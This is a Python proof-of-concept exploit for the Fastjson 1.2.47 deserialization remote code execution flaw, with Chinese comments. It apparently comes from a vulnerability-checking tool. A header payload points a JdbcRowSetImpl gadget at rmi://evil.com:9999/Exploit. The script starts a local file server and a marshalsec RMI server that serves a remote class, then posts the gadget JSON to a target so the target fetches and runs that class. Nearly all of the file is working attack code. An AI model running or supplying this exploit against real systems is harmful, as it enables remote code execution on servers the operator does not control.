'''Exploit
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}
'''
import os
import json
import requests
import subprocess
import http.server
import socketserver
from threading import Thread

LHOST = ""
LPORT = 9998


def get_info():
    return {
        "name": "Fastjson 1.2.47 远程命令执行漏洞",
        "impact_range": "fastjson < 1.2.48",
        "info": "fastjson 在处理 json 对象的时候 @type 字段的处理上存在一些问题, 导致远程代码执行",
        "fixed_time": "2018-10",
    }


def verify(ip, port, cmd="uname"):
    # 切换到文件目录
    web_dir = os.path.join(os.path.dirname(__file__), "../data/fastjson")
    os.chdir(web_dir)
    # 开启一个文件服务器
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("0.0.0.0.", LPORT), handler)
    Thread(target=httpd.serve_forever, daemon=True).start()
    # 借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class
    rmi = subprocess.Popen(
        f'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://{LHOST}:{LPORT}/#TouchFile" 9999')
    data = {
        "a": {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"
        },
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": f"rmi://{LHOST}:9999/Exploit",
            "autoCommit": True
        }
    }
    headers = {'Content-Type': 'application/json'}
    requests.post(f"http://{ip}:{port}/",
                  data=json.dumps(data), headers=headers)
    from time import sleep
    sleep(5)
    rmi.kill()
    httpd.shutdown()

verify("", 8090)